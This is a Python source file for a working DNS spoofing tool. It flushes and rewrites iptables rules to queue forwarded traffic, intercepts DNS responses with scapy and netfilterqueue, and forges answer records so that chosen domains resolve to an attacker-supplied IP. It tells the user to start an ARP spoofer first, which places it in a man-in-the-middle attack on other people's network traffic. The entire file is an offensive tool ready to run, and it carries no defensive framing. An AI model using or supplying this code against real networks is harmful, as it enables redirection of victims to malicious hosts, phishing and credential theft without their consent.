import scapy.all as scapy
import netfilterqueue
import subprocess
import ipaddress
import time


dns_hosts = []
ip = ""


def reset_ipTable():
    print(f"\n[*] Resetting Ip Tables [*]")
    subprocess.call(["iptables","--flush"])
    print(f"\n[+] Exiting...")


def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())
     
        if (scapy_packet.haslayer(scapy.DNSRR)):
            query=scapy_packet[scapy.DNSQR].qname
            print("--------------------")
            print("[+] Intercept request for ====> " , query.decode())
            print(scapy_packet.summary())
     
            # print("query ", query)
            # print("dns Hosts", dns_hosts)

            if query in dns_hosts :
                print(f"[*]Spoofing URl For ",query.decode())
                print("[*] Before Modification")
                print(scapy_packet.summary())
                answer = scapy.DNSRR(rrname=query, rdata=ip)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1
                
                del scapy_packet[scapy.IP].len 
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
                
                packet.set_payload(bytes(scapy_packet))
                
                print("[*] After Modification")
                print(f"{scapy_packet.summary()}")
            print("--------------------")
        packet.accept()
    except KeyboardInterrupt:
        return



def define_queue_iptable():
    queue_number = "99"
    subprocess.run("iptables --flush", check=True, shell=True)
    subprocess.call(["sudo", "iptables","-I","FORWARD","-j","NFQUEUE","--queue-num", queue_number])

    # # packet from the local machine will not go in this chain ,they will only go in the queue if they are comming from the remote computer
    # # for testing his on local host uncomment the below two commands
    # subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num",queue_number])
    # subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num",queue_number])

    # binding the queue to the nerfilter queue
    queue = netfilterqueue.NetfilterQueue()
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        queue.bind(99, process_packet)
        queue.run()
    except KeyboardInterrupt:
        reset_ipTable()


def add_host_in_list():
    URl = input("[+] Please Enter the url to spoof (seperate by blank) : ")
    URl = URl.split()
    for x in URl:
        temp = bytes( x + ".", 'utf-8')
        dns_hosts.append(temp)
    print(f"[*] Spoofing url ==> ", dns_hosts)


def redirect_data():
    while True:
        ip_redirect = input("[+] Please Enter the ip address where you want to rediect the target [-]  :  ")
        if ipv4_check(ip_redirect):
            global ip
            ip = ip_redirect
            break
        else:
            print(f"[*] Please enter a valid ip address [*]")



def ipv4_check(string):
    try:
        ipaddress.IPv4Network(string)
        return True
    except:
        return False


def start_spoofing():
    print(f"Welcome To DNS Spoofer")
    try:
        print(f"[***] Please Start Arp Spoofer Before Using this Module [***]")
        add_host_in_list()
        redirect_data()
        print(f"[++] Intercepting requests .... [++]")
        #call the main program
        define_queue_iptable()
    except KeyboardInterrupt:
        reset_ipTable()
        time.sleep(3)


if __name__ == "__main__":
    start_spoofing()